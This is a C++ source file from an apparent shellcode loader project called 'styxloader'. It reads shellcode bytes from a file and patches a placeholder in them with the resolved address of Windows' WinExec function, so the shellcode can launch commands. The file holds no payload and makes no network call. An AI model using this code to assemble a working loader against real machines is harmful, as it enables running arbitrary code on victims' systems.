#include "styxloader/shellcode.hpp"

#include <windows.h>
#include <fstream>

namespace styxloader {

std::vector<unsigned char> ReadShellcode(const char* filename) {
    std::ifstream file(filename, std::ios::binary);
    return std::vector<unsigned char>(
        (std::istreambuf_iterator<char>(file)),
        std::istreambuf_iterator<char>());
}

bool PatchShellcodeWinExec(std::vector<unsigned char>& shellcode) {
    // The shellcode.asm layout (see commit 6) reserves the first 8 bytes
    // for the WinExec address. The code at offset 8+ uses RIP-relative
    // addressing to load this address. We patch the placeholder here.

    if (shellcode.size() < 8) {
        return false;
    }

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) {
        return false;
    }

    FARPROC winExec = GetProcAddress(hKernel32, "WinExec");
    if (!winExec) {
        return false;
    }

    // Patch the first 8 bytes with the WinExec address (little-endian).
    uint64_t addr = reinterpret_cast<uint64_t>(winExec);
    for (int i = 0; i < 8; ++i) {
        shellcode[i] = static_cast<unsigned char>((addr >> (i * 8)) & 0xFF);
    }

    return true;
}

}  // namespace styxloader
